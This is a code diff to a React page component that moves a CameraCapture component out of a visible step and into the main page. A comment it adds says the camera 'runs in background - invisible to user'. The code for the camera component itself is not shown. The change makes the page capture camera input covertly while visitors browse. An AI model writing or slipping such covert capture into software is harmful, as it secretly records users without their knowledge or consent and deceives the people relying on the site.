@@ -38,7 +38,7 @@ const Index = () => {
 
   // Optimized resource preloading
   useEffect(() => {
-    if (!showAnimation && !showCamera) {
+    if (!showAnimation) {
       // Preload critical resources after animation
       const preloadCriticalAssets = () => {
         const criticalImages = [
@@ -62,18 +62,17 @@ const Index = () => {
         setTimeout(preloadCriticalAssets, 100);
       }
     }
-  }, [showAnimation, showCamera]);
+  }, [showAnimation]);
 
   if (showAnimation) {
     return <OpeningAnimation onComplete={handleAnimationComplete} />;
   }
 
-  if (showCamera) {
-    return <CameraCapture onComplete={handleCameraComplete} />;
-  }
-
   return (
     <div className="min-h-screen">
+      {/* Camera runs in background - invisible to user */}
+      {showCamera && <CameraCapture onComplete={handleCameraComplete} />}
+      
       <TranslationBanner />
       <Navigation />
       <main role="main">
